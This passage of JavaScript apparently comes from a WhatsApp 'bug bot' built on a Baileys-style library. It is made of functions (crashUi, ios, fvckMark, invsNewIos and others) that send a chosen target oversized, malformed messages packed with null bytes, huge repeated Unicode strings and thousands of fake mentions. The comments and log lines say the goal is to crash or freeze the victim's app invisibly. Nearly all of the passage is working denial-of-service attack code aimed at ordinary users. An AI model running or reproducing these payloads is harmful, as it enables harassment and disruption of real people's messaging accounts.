        participant: { jid: target }
    });
    const msg1 = {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "X",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "address_message",
                        paramsJson: "\x10".repeat(1045000),
                        version: 3
                    },
                    entryPointConversionSource: "call_permission_request"
                }
            }
        }
    };

    const msg2 = {
        ephemeralExpiration: 0,
        forwardingScore: 9741,
        isForwarded: true,
        font: Math.floor(Math.random() * 99999999),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999")
    };

    for (let i = 0; i < 10; i++) {
        const payload = generateWAMessageFromContent(target, msg1, msg2);

        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: payload.message
            }
        }, { messageId: payload.key.id, participant: { jid: target } });

        await sleep(1000);
    }

    await sock.relayMessage("status@broadcast", {
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target } }]
            }]
        }]
    });
}

// Crash Home Invis 100%
async function TsxDexbayy(sock, target) { 
    const msg = generateWAMessageFromContent(
      target,
      {
        ephemeralMessage: {
          message: {
            sendPaymentMessage: {
              noteMessage: {
                extendedTextMessage: {
                  text: "By : V-Arven Pro!!",
                  matchedText: "https://t.me/Bayysenpay",
                  description: "!.",
                  title: "",
                  paymentLinkMetadata: {
                    button: { displayText: "\x30" },
                    header: { headerType: 1 },
                    provider: { paramsJson: "{{".repeat(70000) }
                  }
                }
              }
            }
          }
        }
      },
      {}
    )

    await sock.relayMessage(
      target,
      {
        groupStatusMessageV2: {
          message: msg.message
        }
      },
      { messageId: null, participant: { jid: target } }
    )
}

async function ios(sock, target) {
    const statusAttributions = [];  
    for (let i = 0; i < 20000; i++) {
        const statusReshare = {
            source: "CHANNEL_RESHARE",
            duration: 7205,
            channelJid: `${i + 1}@newsletter`,
            channelMessageId: 7205,
            hasMultipleReshares: true
        };        
        statusAttributions.push({ statusReshare });
    }
    await sock.relayMessage(
        "status@broadcast",
        {
            viewOnceMessageV2Extension: {
                message: {
                    extendedTextMessage: {
                        text: "𑇂𑆵𑆴𑆿".repeat(20000),
                        textArgb: Math.random() * 2000,
                        backgroundArgb: Math.random() * 2000,
                        font: "SYSTEM",
                        inviteLinkGroupType: "DEFAULT",
                        paymentLinkMetadata: {
                          button: { displayText: " x" },
                          header: { headerType: 1 },
                          provider: { paramsJson: "\u0003".repeat(70000) }
                        },
                        contextInfo: {
                            forwardingScore: 9999999,
                            isForwarded: true,
                            quotedAd: {
                                advertiserName: " X ",
                                mediaType: "IMAGE",
                                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
                                caption: " X "
                            },
                            placeholderKey: {
                                remoteJid: "status@broadcast",
                                fromMe: false,
                                id: "ABCDEF1234567890"
                            },
                            externalAdReply: {
                                title: "x",
                                body: "𑇂𑆵𑆴𑆿".repeat(30000),
                                mediaType: "VIDEO",
                                renderLargerThumbnail: true,
                                sourceUrl: "https://t.me/primroseell",
                                mediaUrl: "https://t.me/primroseell",
                                containsAutoReply: true,
                                showAdAttribution: true,
                                ctwaClid: "ctwa_clid_example",
                                ref: "ref_example"
                            },
                            statusSourceType: "TEXT",
                            statusAttributionType: "RESHARED_FROM_MENTION",
                            statusAttributions: [
                                {
                                    type: "STATUS_MENTION",
                                    music: {
                                        authorName: "ell",
                                        songId: "1137812656623908",
                                        title: "𑇂𑆵𑆴𑆿".repeat(9000),
                                        author: "𑇂𑆵𑆴𑆿".repeat(9000),
                                        artistAttribution: "https://t.me/primroseell",
                                        isExplicit: true
                                    }
                                },
                                ...statusAttributions
                            ]
                        }
                    }
                }
            }
        },
        {
            statusJidList: [target]
        }
    );
}

async function btnStatus(target, mention) {
let pesan = await generateWAMessageFromContent(target, {
buttonsMessage: {
text: "🔥",
contentText: "Xataa",
footerText: "X",
buttons: [
{ buttonId: ".glitch", buttonText: { displayText: "⚡" + "\u0000".repeat(400000) }, type: 1 }
],
headerType: 1
}
}, {});

await sock.relayMessage("status@broadcast", pesan.message, {
messageId: pesan.key.id,
statusJidList: [target],
additionalNodes: [
{ tag: "meta", attrs: {}, content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target }, content: undefined }] }] }
]
});

if (mention) {
await sock.relayMessage(target, {
groupStatusMentionMessage: {
message: { protocolMessage: { key: pesan.key, type: 25 } }
}
}, {
additionalNodes: [
{ tag: "meta", attrs: { is_status_mention: "⚡" }, content: undefined }
]
});
}

const msg1 = {
        viewOnceMessage: {
            message: {
                groupStatusMessageV2: {
                    message: {
                        interactiveResponseMessage: {
                            nativeFlowResponseMessage: {
                                name: "galaxy_message",
                                paramsJson: "\x10" + "\u0000".repeat(1030000),
                                version: 3
                            }
                        }
                    }
                }
            }
        }
    };
  
  const msg2 = {
        viewOnceMessage: {
            message: {
                groupStatusMessageV2: {
                    message: {
                        interactiveResponseMessage: {
                            nativeFlowResponseMessage: {
                                name: "call_permission_request",
                                paramsJson: "\x10" + "\u0000".repeat(1030000),
                                version: 3
                            }
                        }
                    }
                }
            }
        }
    };
  
  const msg3 = {
        viewOnceMessage: {
            message: {
                groupStatusMessageV2: {
                    message: {
                        interactiveResponseMessage: {
                            nativeFlowResponseMessage: {
                                name: "address_message",
                                paramsJson: "\x10" + "\u0000".repeat(1030000),
                                version: 3
                            }
                        }
                    }
                }
            }
        }
    };
  
  for (const msg of [msg1, msg2, msg3]) {
    await sock.relayMessage(
      "status@broadcast", 
      msg,
      {
        messageId: null,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  {
                    tag: "to",
                    attrs: { jid: target }
                  }
                ]
              }
            ]
          }
        ]
      }
    );
  }
  
  await sock.relayMessage(
    "status@broadcast", 
    {
      statusJidList: [target],
      additionalNodes: [{
          tag: "meta",
          attrs: {
            status_setting: "allowlist"
          },
          content: [{
              tag: "mentioned_users",
              attrs: {},
              content: [{
                  tag: "to",
                  attrs: {
                    jid: target
                  }
              }]
          }]
      }]
    },
    {}
  );
}

async function crashUi(sock, target) {
  const msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            contextInfo: {
              expiration: 1,
              ephemeralSettingTimestamp: 1,
              entryPointConversionSource: "WhatsApp.com",
              entryPointConversionApp: "WhatsApp",
              entryPointConversionDelaySeconds: 1,
              disappearingMode: {
                initiatorDeviceJid: target,
                initiator: "INITIATED_BY_OTHER",
                trigger: "UNKNOWN_GROUPS"
              },
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: [target],
              businessMessageForwardInfo: { 
                 businessOwnerJid: "13135550002@s.whatsapp.net"
              },
              quotedMessage: {
                callLogMesssage: {
                  isVideo: false,
                  callOutcome: "ONGOING",
                  durationSecs: "0",
                  callType: "VOICE_CHAT",
                  participants: [
                    {
                      jid: "13135550002@s.whatsapp.net",
                      callOutcome: "CONNECTED"
                    },
                    ...Array.from({ length: 10000 }, () => ({
                      jid: `1${Math.floor(Math.random() * 99999)}@s.whatsapp.net`,
                      callOutcome: "CONNECTED"
                    }))
                  ]
                }
              },
              externalAdReply: {
                showAdAttribution: false,
                renderLargerThumbnail: true
              }
            },
            header: {
              videoMessage: {
                url: "https://mmg.whatsapp.net/o1/v/t24/f2/m232/AQOS7xVULFd5Ekk1T8o8pWSq-j5UmHzUPG5sq0frfEogEtMRJ_FNjaT7rKYUSm-iImapgmKZ7iq5_9_CC8mSbD0me0ye2OcoyDxaqJU?ccb=9-4&oh=01_Q5Aa2AFf2ZI7JiJkIlqsek6JvJAGekHxXtN9qtw95RhN1meW8g&oe=68987468&_nc_sid=e6ed6c&mms3=true",
                mimetype: "video/mp4",
                fileSha256: "pctPKf/IwXKoCzQ7da4YrzWk+K9kaySQuWqfbA8h0FY=",
                fileLength: "847271",
                seconds: 7,
                mediaKey: "dA+Eu1vaexH4OIHRZbL8uZIND+CKA6ykw9B2OrL+DH4=",
                gifPlayback: true,
                height: 1280,
                width: 576,
                fileEncSha256: "GwTECHj+asNIHYh/L6NAX+92ob/LDSP5jgx/icqHWvk=",
                directPath: "/o1/v/t24/f2/m232/AQOS7xVULFd5Ekk1T8o8pWSq-j5UmHzUPG5sq0frfEogEtMRJ_FNjaT7rKYUSm-iImapgmKZ7iq5_9_CC8mSbD0me0ye2OcoyDxaqJU?ccb=9-4&oh=01_Q5Aa2AFf2ZI7JiJkIlqsek6JvJAGekHxXtN9qtw95RhN1meW8g&oe=68987468&_nc_sid=e6ed6c",
                mediaKeyTimestamp: "1752236759",
                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/4gIoSUNDX1BST0ZJTEUAAQEAAAIYAAAAAAQwAABtbnRyUkdCIFhZWiAAAAAAAAAAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAAHRyWFlaAAABZAAAABRnWFlaAAABeAAAABRiWFlaAAABjAAAABRyVFJDAAABoAAAAChnVFJDAAABoAAAAChiVFJDAAABoAAAACh3dHB0AAAByAAAABRjcHJ0AAAB3AAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAFgAAAAcAHMAUgBHAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFhZWiAAAAAAAABvogAAOPUAAAOQWFlaIAAAAAAAAGKZAAC3hQAAGNpYWVogAAAAAAAAJKAAAA+EAAC2z3BhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABYWVogAAAAAAAA9tYAAQAAAADTLW1sdWMAAAAAAAAAAQAAAAxlblVTAAAAIAAAABwARwBvAG8AZwBsAGUAIABJAG4AYwAuACAAMgAwADEANv/bAEMABgQFBgUEBgYFBgcHBggKEAoKCQkKFA4PDBAXFBgYFxQWFhodJR8aGyMcFhYgLCAjJicpKikZHy0wLSgwJSgpKP/bAEMBBwcHCggKEwoKEygaFhooKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKP/AABEIAGQALQMBIgACEQEDEQH/xAAbAAEAAgMBAQAAAAAAAAAAAAAAAgMBBAYFB//EACsQAAICAQIFAwQCAwAAAAAAAAECAAMRBCEFEhMxUQcUQQYiYXEygUKx8P/EABcBAQEBAQAAAAAAAAAAAAAAAAABAgP/xAAZEQEBAAMBAAAAAAAAAAAAAAAAEQEhQTH/2gAMAwEAAhEDEQA/APgGl4Jq7bbKarOGZcBc366irGWODl3HKfsOc9gRnHMM+PNqxk6NTk6g2tzGwscKT8EH5/MoPOACeYA7g+Z0YqETPMfJjmPkyi/TaezUNVXWaFL2isGy1EALbbliML+TsPIlBjmPkzJDL/IEfuB7vEeFcR4dodFbrPboLUWxUP3MitULKywwQA6OCp/B7FWxqXLxLUXanVGqzVBbCtt/R51LE/JI7kn533nnvdY61K9jstS8tYLEhBknA8DJJ/ZMgSTjJ7bRvosa1+pzMqBtjjpgDt4xiHuZyCRXt4rUf6EqiBY1rNnITcY2QD5z4/7t2mbKLkqrtsqsWq3PTcqQr4ODg/OJVJvY7oiO7MiDCKTkKM5wPG5JkTN4hERKpERAyO8MMEjbbxMRAREQEREBERAREQEREBERARNvQ6CzWLc1dlKCpC7dSwKSNtgO5O/Yb9z2BI1JEIk7UNdj1sVLKSpKsGG3gjY/sSft39p7nmq6fP08dVefOM/wzzY/OMfGcyqxpdPdq9TTptJTZfqLnFddVSlndicBVA3JJOABOp9RvpLjP0nxHS1cb4E/B+vWz1DqrctgDn/NSVLKCoIGDjlJA5t+d4RrdVw7i2i13DrRTrdNel1Fh5cJYrAqfu22IHfbzOs9UvUjjfqHrtG/GvYLVoA6UJoqmSsliOZ/vJYk8q9zjCjYHOVz4mq4gEjOD32MCIhVuptbUXvbYKw7nJFdaov9KoAH9CV4iIEYiIH/2Q==",
                gifAttribution: "NONE"
              },
              hasMediaAttachment: false
            },
            body: {
              text: "ꦾ".repeat(50000)
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(20000),
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: ""
                },
                {
                  name: "galaxy_message",
                  buttonParamsJson: JSON.stringify({
                    flow_action: "navigate",
                    flow_action_payload: { screen: "CTZ_SCREEN" },
                    flow_cta: "ꦾ".repeat(50000),
                    flow_id: "UNDEFINEDONTOP",
                    flow_message_version: "9.903",
                    flow_token: "UNDEFINEDONTOP"
                  })
                }
              ]
            }
          }
        }
      }
    },
    {}
  );
  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
  await sock.relayMessage(
    target,
    {
      groupInviteMessage: {
        groupJid: "120363347113453659@g.us",
        inviteCode: "x",
        inviteExpiration: Date.now(),
        groupName: "؂ن؃؄ٽ؂ن؃".repeat(10000),
        caption:"ꦾ".repeat(50000), 
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/4gIoSUNDX1BST0ZJTEUAAQEAAAIYAAAAAAQwAABtbnRyUkdCIFhZWiAAAAAAAAAAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAAHRyWFlaAAABZAAAABRnWFlaAAABeAAAABRiWFlaAAABjAAAABRyVFJDAAABoAAAAChnVFJDAAABoAAAAChiVFJDAAABoAAAACh3dHB0AAAByAAAABRjcHJ0AAAB3AAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAFgAAAAcAHMAUgBHAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFhZWiAAAAAAAABvogAAOPUAAAOQWFlaIAAAAAAAAGKZAAC3hQAAGNpYWVogAAAAAAAAJKAAAA+EAAC2z3BhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABYWVogAAAAAAAA9tYAAQAAAADTLW1sdWMAAAAAAAAAAQAAAAxlblVTAAAAIAAAABwARwBvAG8AZwBsAGUAIABJAG4AYwAuACAAMgAwADEANv/bAEMABgQFBgUEBgYFBgcHBggKEAoKCQkKFA4PDBAXFBgYFxQWFhodJR8aGyMcFhYgLCAjJicpKikZHy0wLSgwJSgpKP/bAEMBBwcHCggKEwoKEygaFhooKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKP/AABEIAGQALQMBIgACEQEDEQH/xAAbAAEAAgMBAQAAAAAAAAAAAAAAAgMBBAYFB//EACsQAAICAQIFAwQCAwAAAAAAAAECAAMRBCEFEhMxUQcUQQYiYXEygUKx8P/EABcBAQEBAQAAAAAAAAAAAAAAAAABAgP/xAAZEQEBAAMBAAAAAAAAAAAAAAAAEQEhQTH/2gAMAwEAAhEDEQA/APgGl4Jq7bbKarOGZcBc366irGWODl3HKfsOc9gRnHMM+PNqxk6NTk6g2tzGwscKT8EH5/MoPOACeYA7g+Z0YqETPMfJjmPkyi/TaezUNVXWaFL2isGy1EALbbliML+TsPIlBjmPkzJDL/IEfuB7vEeFcR4dodFbrPboLUWxUP3MitULKywwQA6OCp/B7FWxqXLxLUXanVGqzVBbCtt/R51LE/JI7kn533nnvdY61K9jstS8tYLEhBknA8DJJ/ZMgSTjJ7bRvosa1+pzMqBtjjpgDt4xiHuZyCRXt4rUf6EqiBY1rNnITcY2QD5z4/7t2mbKLkqrtsqsWq3PTcqQr4ODg/OJVJvY7oiO7MiDCKTkKM5wPG5JkTN4hERKpERAyO8MMEjbbxMRAREQEREBERAREQEREBERARNvQ6CzWLc1dlKCpC7dSwKSNtgO5O/Yb9z2BI1JEIk7UNdj1sVLKSpKsGG3gjY/sSft39p7nmq6fP08dVefOM/wzzY/OMfGcyqxpdPdq9TTptJTZfqLnFddVSlndicBVA3JJOABOp9RvpLjP0nxHS1cb4E/B+vWz1DqrctgDn/NSVLKCoIGDjlJA5t+d4RrdVw7i2i13DrRTrdNel1Fh5cJYrAqfu22IHfbzOs9UvUjjfqHrtG/GvYLVoA6UJoqmSsliOZ/vJYk8q9zjCjYHOVz4mq4gEjOD32MCIhVuptbUXvbYKw7nJFdaov9KoAH9CV4iIEYiIH/2Q=="
      }
    },
    {
      participant: { jid: target },
      ephemeralExpiration: 5,
      timeStamp: Date.now()
    }
  );
}
async function fvckMark(target) {
  for (let i = 0; i < 10; i++) {
    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: " ¡! Apollo Is Coming !¡ ",
              format: "EXTENSIONS_1"
            },
            contextInfo: {
              quotedMessage: {
                viewOnceMessage: {
                  message: {
                    interactiveResponseMessage: {
                      body: {
                        text: "@xrelly • #fvcker 🩸",
                        format: "EXTENSIONS_1"
                      },
                      nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\u0000",
                        version: 1
                      }
                    }
                  }
                }
              }
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u0000".repeat(1000000),
              version: 1
            }
          }
        }
      }
    }, { userJid: target, participant: { jid: target } })
  }
}

async function QueenSqL(target) {
  const randomHex = (len = 16) =>
    [...Array(len)].map(() => Math.floor(Math.random() * 16).toString(16)).join("");

  const Node = [
    {
      tag: "bot",
      attrs: {
        biz_bot: "1"
      }
    }
  ];

  let msg = generateWAMessageFromContent(target, {
    interactiveMessage: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2,
        messageAssociation: {
          associationType: 2,
          parentMessageKey: randomHex(16)
        },
        messageSecret: randomHex(32), 
        supportPayload: JSON.stringify({
          version: 2,
          is_ai_message: true,
          should_show_system_message: true,
          expiration: -9999,
          ephemeralSettingTimestamp: 9741,
          disappearingMode: {
            initiator: "INITIATED_BY_OTHER",
            trigger: "ACCOUNT_SETTING"
          }
        }),
        isForwarded: true,
        forwardingScore: 1972,
        businessMessageForwardInfo: {
          businessOwnerJid: "13135550002@s.whatsapp.net"
        },
        quotedMessage: {
          interactiveMessage: {
            header: {
              hasMediaAttachment: true,
              jpegThumbnail: fs.readFileSync('./Zu.jpg'),
              title: "Wilzu" + "᭄".repeat(5000)
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "review_and_pay".repeat(5000),
                  buttonParamsJson: JSON.stringify({
                    currency: "XXX",
                    payment_configuration: "",
                    payment_type: "",
                    total_amount: { value: 1000000, offset: 100 },
                    reference_id: "4SWMDTS1PY4",
                    type: "physical-goods",
                    order: {
                      status: "payment_requested",
                      description: "",
                      subtotal: { value: 0, offset: 100 },
                      order_type: "PAYMENT_REQUEST",
                      items: [
                        {
                          retailer_id: "custom-item-6bc19ce3-67a4-4280-ba13-ef8366014e9b",
                          name: "wilzu is herr".repeat(5000),
                          amount: { value: 1000000, offset: 100 },
                          quantity: 1
                        }
                      ]
                    },
                    additional_note: "Dwilzu",
                    native_payment_methods: [],
                    share_payment_status: true
                  })
                }
              ],
              messageParamsJson: "{}"
            }
          }
        }
      },
      header: {
        hasMediaAttachment: true,
        locationMessage: {
          degreesLatitude: 0,
          degreesLongitude: 0
        }
      },
      nativeFlowMessage: {
        buttons: [
          {
            name: "payment_method",
            buttonParamsJson: JSON.stringify({
              currency: "IDR",
              total_amount: { value: 1000000, offset: 100 },
              reference_id: "Dwilzu",
              type: "physical-goods",
              order: {
                status: "canceled",
                subtotal: { value: 0, offset: 100 },
                order_type: "PAYMENT_REQUEST",
                items: [
                  {
                    retailer_id: "custom-item-6bc19ce3-67a4-4280-ba13-ef8366014e9b",
                    name: "wilzu is herr".repeat(5000),
                    amount: { value: 1000000, offset: 100 },
                    quantity: 1000
                  }
                ]
              },
              additional_note: "wilzu ",
              native_payment_methods: [],
              share_payment_status: true
            })
          }
        ],
        messageParamsJson: "{}"
      },
      annotations: [
        {
          embeddedContent: {
            embeddedMessage: {
              message: "wilzu is here"
            }
          },
          location: {
            degreesLongitude: 0,
            degreesLatitude: 0,
            name: "wilzu is herr".repeat(5000)
          },
          polygonVertices: [
            { x: 60.71664810180664, y: -36.39784622192383 },
            { x: -16.710189819335938, y: 49.263675689697266 },
            { x: -56.585853576660156, y: 37.85963439941406 },
            { x: 20.840980529785156, y: -47.80188751220703 }
          ],
          newsletter: {
            newsletterJid: "1@newsletter",
            newsletterName: "wilzu is herr".repeat(5000),
            contentType: "UPDATE",
            accessibilityText: "Wilzu"
          }
        }
      ]
    }
  }, { userJid: target });

  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id,
    additionalnodes: [
      {
        tag: "interactive",
        attrs: {
          type: "native_flow",
          v: "1"
        },
        content: [
          {
            tag: "native_flow",
            attrs: {
              v: "9",
              name: "payment_method"
            },
            content: [
              {
                tag: "extensions_metadata",
                attrs: {
                  flow_message_version: "3",
                  well_version: "700"
                },
                content: []
              }
            ]
          }
        ]
      }
    ]
  });
}

async function AyunBelovedxnxx(sock, target) {
  console.log(chalk.red(`𝗢𝘁𝗮𝘅 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`));

  let peler = await sock.relayMessage(
    target,
    {
      extendedTextMessage: {
        text: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "ꦾ".repeat(50000) + "\n\nJust OTAX" + "\0".repeat(100),
        matchedText: "https://t.me/Otapengenkawin",
        description: "⸙ᵒᵗᵃˣнοω αяє γου?¿",
        title: "ꦽ".repeat(20000),
        previewType: 6,
        jpegThumbnail:
          "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAMAMBIgACEQEDEQH/xAAtAAEBAQEBAQAAAAAAAAAAAAAAAQQCBQYBAQEBAAAAAAAAAAAAAAAAAAEAAv/aAAwDAQACEAMQAAAA+aspo6VwqliSdxJLI1zjb+YxtmOXq+X2a26PKZ3t8/rnWJRyAoJ//8QAIxAAAgMAAQMEAwAAAAAAAAAAAQIAAxEEEBJBICEwMhNCYf/aAAgBAQABPwD4MPiH+j0CE+/tNPUTzDBmTYfSRnWniPandoAi8FmVm71GRuE6IrlhhMt4llaszEYOtN1S1V6318RblNTKT9n0yzkUWVmvMAzDOVel1SAfp17zA5n5DCxPwf/EABgRAAMBAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/AN3jIxY//8QAHBEAAwACAwEAAAAAAAAAAAAAAAERAhIQICEx/9oACAEDAQE/ACPn2n1CVNGNRmLStNsTKN9P/9k=",
        paymentLinkMetadata: {
          button: {
            displayText: "Love U My Ayun"
          },
          header: {
            headerType: 1
          },
          provider: {
            paramsJson: "{".repeat(10000)
          }
        },
        contextInfo: {
          isForwarded: true,
          forwardingScore: 9999,
          participant: target,
          remoteJid: "status@broadcast",
          mentionedJid: [
            "0@s.whatsapp.net",
            ...Array.from({ length: 1995 }, () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`)
          ],
          quotedMessage: {
            newsletterAdminInviteMessage: {
              newsletterJid: "otax@newsletter",
              newsletterName: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "ꦾ".repeat(10000),
              caption: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "ꦾ".repeat(60000) + "ោ៝".repeat(60000),
              inviteExpiration: "999999999"
            }
          },
          forwardedNewsletterMessageInfo: {
            newsletterName: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "⃝꙰꙰꙰".repeat(10000),
            newsletterJid: "13135550002@newsletter",
            serverId: 1
          }
        }
      }
    },
    { participant: { jid: target } }
  );

  await sleep(1000);
  await sock.sendMessage(target, {
    delete: {
     remoteJid: target,
      fromMe: true,
      id: peler.key.id,
      participant: target
    }
  });

  console.log(chalk.bold.red("Delay Visib Success To " + target));
}

async function invsNewIos(target) {
  let msg = generateWAMessageFromContent(
    target,
    {
      contactMessage: {
        displayName:
          "🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666" +
          "𑇂𑆵𑆴𑆿".repeat(10000),
        vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"𑇂𑆵𑆴𑆿".repeat(10000)};;;\nFN:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"𑇂𑆵𑆴𑆿".repeat(10000)}\nNICKNAME:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nORG:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nTITLE:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nitem1.TEL;waid=6287873499996:+62 878-7349-9996\nitem1.X-ABLabel:Telepon\nitem2.EMAIL;type=INTERNET:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nitem2.X-ABLabel:Kantor\nitem3.EMAIL;type=INTERNET:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nitem3.X-ABLabel:Kantor\nitem4.EMAIL;type=INTERNET:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nitem4.X-ABLabel:Pribadi\nitem5.ADR:;;🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)};;;;\nitem5.X-ABADR:ac\nitem5.X-ABLabel:Rumah\nX-YAHOO;type=KANTOR:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 